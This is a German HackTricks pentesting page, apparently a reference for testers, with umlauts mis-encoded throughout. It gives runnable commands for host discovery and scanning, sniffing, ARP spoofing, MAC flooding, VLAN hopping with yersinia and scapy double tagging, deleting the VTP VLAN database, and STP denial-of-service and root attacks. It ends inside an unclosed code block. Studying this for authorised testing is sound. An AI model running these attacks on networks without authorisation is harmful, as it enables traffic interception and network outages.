# Pentesting Netzwerk

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker entwickelt wurde**! Treten Sie uns noch heute unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und verdienen Sie Pr√§mien von bis zu **100.000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Entdecken von Hosts von au√üen

Dies wird ein **kurzer Abschnitt** dar√ºber sein, wie man **IPs findet**, die aus dem **Internet antworten**.\
In dieser Situation haben Sie einen **IP-Bereich** (vielleicht sogar mehrere **Bereiche**) und Sie m√∂chten nur herausfinden, **welche IPs antworten**.

### ICMP

Dies ist der **einfachste** und **schnellste** Weg, um festzustellen, ob ein Host aktiv ist oder nicht.\
Sie k√∂nnten versuchen, einige **ICMP-Pakete** zu senden und **Antworten zu erwarten**. Der einfachste Weg besteht darin, eine **Echo-Anforderung** zu senden und auf die Antwort zu warten. Sie k√∂nnen dies mit einem einfachen `ping` oder mit `fping` f√ºr **Bereiche** tun.\
Sie k√∂nnen auch **nmap** verwenden, um andere Arten von ICMP-Paketen zu senden (dadurch werden Filter f√ºr g√§ngige ICMP-Echo-Anforderungen vermieden).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP-Port-Erkennung

Es ist sehr h√§ufig, dass alle Arten von ICMP-Paketen gefiltert werden. Dann k√∂nnen Sie nur versuchen, offene Ports zu finden, um festzustellen, ob ein Host erreichbar ist. Jeder Host hat 65535 Ports, daher k√∂nnen Sie bei einem "gro√üen" Umfang nicht testen, ob jeder Port jedes Hosts ge√∂ffnet ist oder nicht, das w√ºrde zu viel Zeit in Anspruch nehmen.\
Was Sie brauchen, ist ein schneller Portscanner ([masscan](https://github.com/robertdavidgraham/masscan)) und eine Liste der am h√§ufigsten verwendeten Ports:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Sie k√∂nnen diesen Schritt auch mit `nmap` durchf√ºhren, aber es ist langsamer und `nmap` hat Probleme beim Identifizieren von Hosts.

### HTTP-Port-Erkennung

Dies ist nur eine TCP-Port-Erkennung, die n√ºtzlich ist, wenn Sie sich auf die Entdeckung von HTTP-Diensten konzentrieren m√∂chten:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP-Porterkennung

Sie k√∂nnen auch versuchen, einige **offene UDP-Ports** zu √ºberpr√ºfen, um zu entscheiden, ob Sie einem **Host** mehr Aufmerksamkeit schenken sollten. Da UDP-Dienste normalerweise **keine Daten** auf eine regul√§re leere UDP-Sondierungsanforderung antworten, ist es schwierig zu sagen, ob ein Port gefiltert oder ge√∂ffnet ist. Der einfachste Weg, dies zu entscheiden, besteht darin, ein Paket im Zusammenhang mit dem ausgef√ºhrten Dienst zu senden. Da Sie jedoch nicht wissen, welcher Dienst ausgef√ºhrt wird, sollten Sie den wahrscheinlichsten basierend auf der Portnummer ausprobieren:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Die zuvor vorgeschlagene nmap-Zeile testet die **Top 1000 UDP-Ports** in jedem Host innerhalb des **/24**-Bereichs, aber selbst das dauert **>20 Minuten**. Wenn Sie **schnellere Ergebnisse** ben√∂tigen, k√∂nnen Sie [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) verwenden: `./udp-proto-scanner.pl 199.66.11.53/24` Dies sendet diese **UDP-Sonden** an ihren **erwarteten Port** (f√ºr einen /24-Bereich dauert dies nur 1 Minute): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Hier finden Sie eine gute Anleitung zu allen bekannten Wifi-Angriffen zum Zeitpunkt des Schreibens:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Entdecken von Hosts von innen heraus

Wenn Sie sich im Netzwerk befinden, m√∂chten Sie wahrscheinlich als erstes andere Hosts entdecken. Je nachdem, wie viel L√§rm Sie machen m√∂chten oder k√∂nnen, k√∂nnen verschiedene Aktionen durchgef√ºhrt werden:

### Passiv

Sie k√∂nnen diese Tools verwenden, um Hosts in einem verbundenen Netzwerk passiv zu entdecken:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktiv

Beachten Sie, dass die in [_**Entdeckung von Hosts von au√üen**_](./#entdeckung-von-hosts-von-au√üen) (_TCP/HTTP/UDP/SCTP-Porterkennung_) kommentierten Techniken auch **hier angewendet werden k√∂nnen**.\
Da Sie sich jedoch im **selben Netzwerk** wie die anderen Hosts befinden, k√∂nnen Sie **mehr Dinge tun**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktives ICMP

Beachten Sie, dass die in _Discovering hosts from the outside_ ([_**ICMP**_](./#icmp)) kommentierten Techniken auch hier angewendet werden k√∂nnen.\
Da Sie sich jedoch im **selben Netzwerk** wie die anderen Hosts befinden, k√∂nnen Sie **mehr Dinge** tun:

* Wenn Sie eine **Subnetz-Broadcast-Adresse** anpingen, sollte der Ping bei **jedem Host** ankommen und sie k√∂nnten Ihnen antworten: `ping -b 10.10.5.255`
* Durch Anpingen der **Netzwerk-Broadcast-Adresse** k√∂nnen Sie sogar Hosts in **anderen Subnetzen** finden: `ping -b 255.255.255.255`
* Verwenden Sie die Flags `-PE`, `-PP`, `-PM` von `nmap`, um die Host-Erkennung durch das Senden von **ICMPv4 Echo**, **Timestamp** und **Subnetzmasken-Anfragen** durchzuf√ºhren: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan wird verwendet, um Computer √ºber eine **Netzwerknachricht** einzuschalten. Das Magic Packet, das verwendet wird, um den Computer einzuschalten, ist nur ein Paket, bei dem eine **MAC-Dst** angegeben wird und dann **16 Mal** im selben Paket wiederholt wird.\
Diese Art von Paketen wird normalerweise in einem **Ethernet 0x0842** oder in einem **UDP-Paket an Port 9** gesendet.\
Wenn keine \[MAC] angegeben ist, wird das Paket an **Broadcast Ethernet** gesendet (und die wiederholte Broadcast-MAC wird verwendet).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scannen von Hosts

Sobald Sie alle IPs (extern oder intern) entdeckt haben, die Sie gr√ºndlich scannen m√∂chten, k√∂nnen verschiedene Aktionen durchgef√ºhrt werden.

### TCP

* **Offener** Port: _SYN --> SYN/ACK --> RST_
* **Geschlossener** Port: _SYN --> RST/ACK_
* **Gefilterter** Port: _SYN --> \[KEINE ANTWORT]_
* **Gefilterter** Port: _SYN --> ICMP-Nachricht_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Es gibt 2 M√∂glichkeiten, einen UDP-Port zu scannen:

* Senden Sie ein **UDP-Paket** und √ºberpr√ºfen Sie die Antwort _**ICMP unreachable**_, wenn der Port **geschlossen** ist (in einigen F√§llen wird ICMP **gefiltert**, sodass Sie keine Informationen erhalten, ob der Port geschlossen oder ge√∂ffnet ist).
* Senden Sie **formatierte Datagramme**, um eine Antwort von einem **Dienst** (z. B. DNS, DHCP, TFTP und andere, wie in _nmap-payloads_ aufgef√ºhrt) zu erhalten. Wenn Sie eine **Antwort** erhalten, ist der Port **ge√∂ffnet**.

**Nmap** wird beide Optionen mit "-sV" kombinieren (UDP-Scans sind sehr langsam), aber beachten Sie, dass UDP-Scans langsamer sind als TCP-Scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP-Scan

**SCTP (Stream Control Transmission Protocol)** ist darauf ausgelegt, zusammen mit **TCP (Transmission Control Protocol)** und **UDP (User Datagram Protocol)** verwendet zu werden. Sein Hauptzweck besteht darin, den Transport von Telefondaten √ºber IP-Netzwerke zu erleichtern und viele der Zuverl√§ssigkeitsfunktionen des **Signaling System 7 (SS7)** zu spiegeln. **SCTP** ist eine Kernkomponente der **SIGTRAN**-Protokollfamilie, die darauf abzielt, SS7-Signale √ºber IP-Netzwerke zu transportieren.

Die Unterst√ºtzung f√ºr **SCTP** wird von verschiedenen Betriebssystemen wie **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** und **VxWorks** bereitgestellt, was auf seine breite Akzeptanz und N√ºtzlichkeit im Bereich Telekommunikation und Netzwerke hinweist.

Nmap bietet zwei verschiedene Scans f√ºr SCTP an: _-sY_ und _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS und IPS Umgehung

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Weitere nmap-Optionen**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Enth√ºllung interner IP-Adressen

**Fehlkonfigurierte Router, Firewalls und Netzwerkger√§te** antworten manchmal auf Netzwerksonden mit **nicht√∂ffentlichen Quelladressen**. **tcpdump** kann verwendet werden, um Pakete zu identifizieren, die von privaten Adressen w√§hrend des Tests empfangen wurden. Insbesondere auf Kali Linux k√∂nnen Pakete auf der **eth2-Schnittstelle** erfasst werden, die aus dem √∂ffentlichen Internet erreichbar ist. Es ist wichtig zu beachten, dass solche Pakete wahrscheinlich herausgefiltert werden, wenn Ihre Konfiguration hinter einem NAT oder einer Firewall liegt.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Beim Sniffing k√∂nnen Sie durch √úberpr√ºfung erfasster Frames und Pakete Details zu IP-Bereichen, Subnetzgr√∂√üen, MAC-Adressen und Hostnamen erfahren. Wenn das Netzwerk falsch konfiguriert ist oder der Switching-Fabric unter Stress steht, k√∂nnen Angreifer sensible Informationen durch passives Netzwerk-Sniffing erfassen.

Wenn ein geschaltetes Ethernet-Netzwerk ordnungsgem√§√ü konfiguriert ist, sehen Sie nur Broadcast-Frames und Material, das f√ºr Ihre MAC-Adresse bestimmt ist.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Man kann auch √ºber eine SSH-Sitzung mit Wireshark als GUI in Echtzeit Pakete von einer entfernten Maschine erfassen.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
Bettercap ist ein m√§chtiges, flexibles und dennoch einfach zu bedienendes Framework f√ºr Netzwerkangriffe. Es bietet eine Vielzahl von Funktionen und Werkzeugen, die bei der Durchf√ºhrung von Penetrationstests und Sicherheitsaudits hilfreich sind. Mit Bettercap k√∂nnen Sie verschiedene Angriffe wie Man-in-the-Middle-Angriffe, ARP-Spoofing, DNS-Spoofing und SSL-Stripping durchf√ºhren. Es unterst√ºtzt auch das Sniffing von Netzwerkverkehr, das Erstellen von Rogue Access Points und das Durchf√ºhren von Wireless Attacks. Bettercap ist ein unverzichtbares Werkzeug f√ºr jeden Ethical Hacker oder Sicherheitsexperten, der Netzwerke untersucht und Schwachstellen aufdecken m√∂chte.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Offensichtlich.

### Erfassen von Anmeldedaten

Sie k√∂nnen Tools wie [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) verwenden, um Anmeldedaten aus einer pcap-Datei oder einer Live-Schnittstelle zu analysieren.

## LAN-Angriffe

### ARP-Spoofing

ARP-Spoofing besteht darin, gef√§lschte ARP-Antworten zu senden, um anzuzeigen, dass die IP einer Maschine die MAC unseres Ger√§ts hat. Dann √§ndert das Opfer die ARP-Tabelle und kontaktiert unsere Maschine jedes Mal, wenn es die gef√§lschte IP kontaktieren m√∂chte.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

Arpspoof ist ein Tool, das in der Netzwerk-Penetrationstestphase verwendet wird, um ARP-Spoofing-Angriffe durchzuf√ºhren. ARP-Spoofing ist eine Technik, bei der ein Angreifer den ARP-Cache eines Netzwerks manipuliert, um den Datenverkehr umzuleiten oder abzufangen.

Mit Arpspoof k√∂nnen Sie ARP-Pakete senden, um gef√§lschte ARP-Antworten an die Zielmaschine und den Gateway-Router zu senden. Dadurch wird der ARP-Cache der Zielmaschine aktualisiert und der Datenverkehr an den Angreifer umgeleitet.

Arpspoof ist Teil des Dsniff-Toolsatzes und kann auf Linux- und Unix-Systemen verwendet werden. Es erfordert Root-Zugriff, da es direkt auf die Netzwerkschnittstelle zugreift.

Die Verwendung von Arpspoof erfordert ein grundlegendes Verst√§ndnis des ARP-Protokolls und der Netzwerkarchitektur. Es sollte nur in einer kontrollierten Umgebung und mit Zustimmung des Netzwerkeigent√ºmers eingesetzt werden.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM-√úberlauf

√úberfluten Sie die CAM-Tabelle des Switches, indem Sie viele Pakete mit unterschiedlichen Quell-MAC-Adressen senden. Wenn die CAM-Tabelle voll ist, verh√§lt sich der Switch wie ein Hub und sendet den gesamten Datenverkehr als Broadcast.
```bash
macof -i <interface>
```
In modernen Switches wurde diese Schwachstelle behoben.

### 802.1Q VLAN / DTP-Angriffe

#### Dynamisches Trunking

Das **Dynamic Trunking Protocol (DTP)** ist als Link-Layer-Protokoll konzipiert, um ein automatisches System f√ºr Trunking zu erm√∂glichen, das es Switches erm√∂glicht, Ports automatisch f√ºr den Trunk-Modus (Trunk) oder den Nicht-Trunk-Modus auszuw√§hlen. Die Verwendung von **DTP** wird oft als Hinweis auf eine suboptimale Netzwerkkonfiguration angesehen, was die Bedeutung der manuellen Konfiguration von Trunks nur dort, wo es notwendig ist, und der ordnungsgem√§√üen Dokumentation unterstreicht.

Standardm√§√üig sind Switch-Ports auf den Betrieb im Dynamic Auto-Modus eingestellt, was bedeutet, dass sie bereit sind, Trunking zu initiieren, wenn sie von einem benachbarten Switch dazu aufgefordert werden. Ein Sicherheitsproblem entsteht, wenn ein Pentester oder Angreifer sich mit dem Switch verbindet und ein DTP Desirable Frame sendet, um den Port in den Trunk-Modus zu versetzen. Diese Aktion erm√∂glicht es dem Angreifer, VLANs durch STP Frame-Analyse aufzulisten und die VLAN-Segmentierung durch Einrichtung virtueller Schnittstellen zu umgehen.

Die Anwesenheit von DTP in vielen Switches standardm√§√üig kann von Angreifern ausgenutzt werden, um das Verhalten eines Switches zu imitieren und so Zugriff auf den Datenverkehr √ºber alle VLANs zu erhalten. Das Skript [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) wird verwendet, um eine Schnittstelle zu √ºberwachen und festzustellen, ob ein Switch im Default-, Trunk-, Dynamic-, Auto- oder Access-Modus ist, wobei letzterer die einzige Konfiguration ist, die gegen VLAN-Hopping-Angriffe immun ist. Dieses Tool bewertet den Schwachstellenstatus des Switches.

Sollte eine Netzwerkschwachstelle identifiziert werden, kann das Tool _**Yersinia**_ verwendet werden, um √ºber das DTP-Protokoll "Trunking zu aktivieren", was die Beobachtung von Paketen aus allen VLANs erm√∂glicht.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Um die VLANs aufzulisten, ist es auch m√∂glich, das Skript [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py) zu verwenden. Unter keinen Umst√§nden das Skript unterbrechen. Es injiziert alle drei Sekunden ein DTP Desirable. **Die dynamisch erstellten Trunk-Kan√§le am Switch bleiben nur f√ºnf Minuten lang bestehen. Nach f√ºnf Minuten wird der Trunk deaktiviert.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Ich m√∂chte darauf hinweisen, dass **Access/Desirable (0x03)** anzeigt, dass das DTP-Feld vom Typ "Desirable" ist, was dem Port mitteilt, in den Trunk-Modus zu wechseln. Und **802.1Q/802.1Q (0xa5)** gibt den Encapsulation-Typ **802.1Q** an.

Durch die Analyse der STP-Frames erfahren wir von der Existenz von VLAN 30 und VLAN 60.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Angriff auf spezifische VLANs

Sobald Sie die VLAN-IDs und IP-Werte kennen, k√∂nnen Sie eine virtuelle Schnittstelle konfigurieren, um ein bestimmtes VLAN anzugreifen.\
Wenn DHCP nicht verf√ºgbar ist, verwenden Sie _ifconfig_, um eine statische IP-Adresse festzulegen.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatischer VLAN-Hopper

Der diskutierte Angriff auf **Dynamic Trunking und das Erstellen virtueller Schnittstellen zum Entdecken von Hosts in anderen VLANs** wird **automatisch** von dem Tool durchgef√ºhrt: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Doppeltes Tagging

Wenn ein Angreifer den Wert der **MAC-, IP- und VLAN-ID des Opferhosts** kennt, kann er versuchen, einen Frame **mit seinem zugewiesenen VLAN und dem VLAN des Opfers doppelt zu taggen** und ein Paket zu senden. Da das **Opfer keine Verbindung zum Angreifer herstellen kann**, ist die **beste Option f√ºr den Angreifer die Kommunikation √ºber UDP** mit Protokollen, die interessante Aktionen ausf√ºhren k√∂nnen (wie SNMP).

Eine andere Option f√ºr den Angreifer besteht darin, einen **TCP-Port-Scan zu starten und dabei eine vom Angreifer kontrollierte und vom Opfer erreichbare IP zu f√§lschen** (wahrscheinlich √ºber das Internet). Anschlie√üend k√∂nnte der Angreifer in dem zweiten von ihm besessenen Host mith√∂ren, ob er Pakete vom Opfer empf√§ngt.

![](<../../.gitbook/assets/image (635) (1).png>)

Um diesen Angriff durchzuf√ºhren, k√∂nnen Sie scapy verwenden: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Umgehung der VLAN-Segmentierung auf der Lateralen Ebene <a href="#d679" id="d679"></a>

Wenn Sie **Zugriff auf einen Switch haben, mit dem Sie direkt verbunden sind**, haben Sie die M√∂glichkeit, die VLAN-Segmentierung im Netzwerk zu **umgehen**. Schalten Sie einfach den Port in den Trunk-Modus (auch als Trunk bezeichnet), erstellen Sie virtuelle Schnittstellen mit den IDs der Ziel-VLANs und konfigurieren Sie eine IP-Adresse. Sie k√∂nnen versuchen, die Adresse dynamisch (DHCP) anzufordern, oder Sie k√∂nnen sie statisch konfigurieren. Es h√§ngt vom Fall ab.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Umgehung von Layer 3 Private VLAN

In bestimmten Umgebungen, wie z.B. Gast-WLAN-Netzwerken, werden **Port-Isolierung (auch als Private VLAN bezeichnet)** Einstellungen implementiert, um zu verhindern, dass Clients, die mit einem drahtlosen Zugangspunkt verbunden sind, direkt miteinander kommunizieren k√∂nnen. Es wurde jedoch eine Technik identifiziert, die diese Isolationsma√ünahmen umgehen kann. Diese Technik nutzt entweder das Fehlen von Netzwerk-ACLs oder deren falsche Konfiguration aus, um IP-Pakete √ºber einen Router zu routen und einen anderen Client im selben Netzwerk zu erreichen.

Der Angriff wird ausgef√ºhrt, indem ein **Paket erstellt wird, das die IP-Adresse des Zielclients, aber mit der MAC-Adresse des Routers**, tr√§gt. Dadurch leitet der Router das Paket irrt√ºmlicherweise an den Zielclient weiter. Dieser Ansatz √§hnelt dem bei Double Tagging Attacks verwendeten Ansatz, bei dem die F√§higkeit, auf einen Host zuzugreifen, der f√ºr das Opfer zug√§nglich ist, genutzt wird, um die Sicherheitsl√ºcke auszunutzen.

**Hauptschritte des Angriffs:**
1. **Erstellen eines Pakets:** Ein Paket wird speziell erstellt, um die IP-Adresse des Zielclients, aber mit der MAC-Adresse des Routers, zu enthalten.
2. **Ausnutzen des Router-Verhaltens:** Das erstellte Paket wird an den Router gesendet, der aufgrund der Konfiguration das Paket an den Zielclient weiterleitet und somit die durch private VLAN-Einstellungen bereitgestellte Isolation umgeht.

### VTP-Angriffe

VTP (VLAN Trunking Protocol) zentralisiert das VLAN-Management. Es verwendet Revisionsnummern, um die Integrit√§t der VLAN-Datenbank zu gew√§hrleisten. Jede √Ñnderung erh√∂ht diese Nummer. Switches √ºbernehmen Konfigurationen mit h√∂heren Revisionsnummern und aktualisieren ihre eigenen VLAN-Datenbanken.

#### VTP-Dom√§nenrollen

- **VTP-Server:** Verwaltet VLANs - erstellt, l√∂scht, √§ndert. Er sendet VTP-Ank√ºndigungen an Dom√§nenmitglieder.
- **VTP-Client:** Empf√§ngt VTP-Ank√ºndigungen, um seine VLAN-Datenbank zu synchronisieren. Diese Rolle ist von lokalen VLAN-Konfigurations√§nderungen ausgeschlossen.
- **VTP-Transparent:** Nimmt nicht an VTP-Updates teil, leitet jedoch VTP-Ank√ºndigungen weiter. Unbeeinflusst von VTP-Angriffen, beh√§lt es eine konstante Revisionsnummer von null bei.

#### VTP-Ank√ºndigungstypen

- **Zusammenfassungsank√ºndigung:** Wird alle 300 Sekunden vom VTP-Server ausgestrahlt und enth√§lt wichtige Dom√§neninformationen.
- **Teilmenge-Ank√ºndigung:** Wird nach VLAN-Konfigurations√§nderungen gesendet.
- **Ank√ºndigungsanforderung:** Wird von einem VTP-Client zur Anforderung einer Zusammenfassungsank√ºndigung ausgegeben, normalerweise als Reaktion auf das Erkennen einer h√∂heren Konfigurationsrevisionsnummer.

VTP-Schwachstellen sind ausschlie√ülich √ºber Trunk-Ports ausnutzbar, da VTP-Ank√ºndigungen ausschlie√ülich √ºber diese Ports zirkulieren. Nach DTP-Angriffsszenarien kann sich der Fokus auf VTP verlagern. Tools wie Yersinia k√∂nnen VTP-Angriffe erleichtern, um die VLAN-Datenbank zu l√∂schen und das Netzwerk effektiv zu st√∂ren.

Hinweis: Diese Diskussion bezieht sich auf VTP-Version 1 (VTPv1).
```bash
%% yersinia -G # Launch Yersinia in graphical mode ```
```
Im grafischen Modus von Yersinia w√§hlen Sie die Option zum L√∂schen aller VTP-VLANs, um die VLAN-Datenbank zu bereinigen.


### STP-Angriffe

**Wenn Sie keine BPDU-Frames auf Ihren Schnittstellen erfassen k√∂nnen, ist es unwahrscheinlich, dass Sie bei einem STP-Angriff erfolgreich sind.**

#### **STP BPDU DoS**

Durch das Senden vieler BPDUs TCP (Topology Change Notification) oder Conf (die BPDUs, die gesendet werden, wenn die Topologie erstellt wird) werden die Switches √ºberlastet und funktionieren nicht mehr korrekt.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Angriff**

Wenn ein TCP-Paket gesendet wird, wird die CAM-Tabelle der Switches in 15 Sekunden gel√∂scht. Wenn Sie kontinuierlich solche Pakete senden, wird die CAM-Tabelle kontinuierlich neu gestartet (oder alle 15 Sekunden) und wenn sie neu gestartet wird, verh√§lt sich der Switch wie ein Hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Der Angreifer simuliert das Verhalten eines Switches, um zum STP-Root des Netzwerks zu werden. Dadurch wird mehr Datenverkehr √ºber ihn geleitet. Dies ist interessant, wenn Sie mit zwei verschiedenen Switches verbunden sind.\
Dies wird erreicht, indem BPDUs CONF-Pakete gesendet werden, in denen der **priority**-Wert geringer ist als die tats√§chliche Priorit√§t des aktuellen Root-Switches.
```bash
yersinia stp -attack 4 #Behaves like the root switch
